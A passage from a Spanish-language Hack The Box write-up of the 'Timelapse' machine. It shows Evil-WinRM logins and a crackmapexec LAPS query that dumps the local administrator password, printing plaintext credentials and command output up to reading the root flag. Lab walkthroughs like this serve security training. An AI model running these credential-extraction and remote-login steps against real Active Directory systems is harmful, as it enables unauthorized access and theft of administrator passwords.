SessionOption &lt;span class=&quot;nv&quot;&gt;$so&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-scriptblock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
get-aduser &lt;span class=&quot;nt&quot;&gt;-filter&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-properties&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora simplemente utilizando Evil-WinRM me conecto como el usuario &lt;strong&gt;svc_deploy&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.11.152 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;svc_deploy&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;E3R$Q62^12p7PLlC%KWaxuaV&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Estando conectado como &lt;strong&gt;svc_deploy&lt;/strong&gt; realizo un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net user&lt;/code&gt; para revisar permisos:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;svc_deploy&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;Documents&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;svc_deploy&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;                    &lt;span class=&quot;n&quot;&gt;svc_deploy&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Full&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;                    &lt;span class=&quot;n&quot;&gt;svc_deploy&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Comment&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enseguida me llama la atencion el de &lt;strong&gt;LAPS_Readers&lt;/strong&gt;, leyendo en Google, LAPS &lt;strong&gt;permite administrar la contraseña del Administrador Local.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Asi que busco alguna manera de aprovecharme de este privilegio.&lt;/p&gt;

&lt;p&gt;Finalmente leyendo en &lt;a href=&quot;https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/laps&quot;&gt;Hacktricks&lt;/a&gt;opto por utilizar crackmapexec para extraer la contraseña. Esto se realiza desde la terminal de Linux, ya que acá simplemente utilizaremos las credenciales que ya obtuvimos de &lt;strong&gt;svc_deploy&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec ldap 10.10.11.152 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;svc_deploy&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;E3R$Q62^12p7PLlC%KWaxuaV&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--kdcHost&lt;/span&gt; 10.10.11.152 &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; laps
SMB         10.10.11.152    445    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:timelapse.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
LDAP        10.10.11.152    389    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] timelapse.htb&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_deploy:E3R&lt;span class=&quot;nv&quot;&gt;$Q62&lt;/span&gt;^12p7PLlC%KWaxuaV 
LAPS        10.10.11.152    389    DC01             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer: DC01&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;               Password: 8hQ]W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;p5@MeKIl.IHjuD%tAu
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez obtenida me vuelvo a conectar con Evil-WinRM utilizando el usuario Administrator:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.11.152 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Administrator&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;8hQ]W)p5@MeKIl.IHjuD%tAu&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ROOT SHELL OBTENIDA&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ahora solo queda ir por la flag:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;timelapse&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;RX&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;RX&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;RX&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;       10/26/2023   5:32 PM             34 root.txt


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;RX&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;root.txt
8c3739d6&lt;span class=&quot;k&quot;&gt;********************&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Con esto la maquina queda finalizada.&lt;/p&gt;

&lt;p&gt;Happy Hacking!!&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="Facil," /><category term="Windows" /><summary type="html">Timelapse ~ Hack The Box</summary></entry></feed>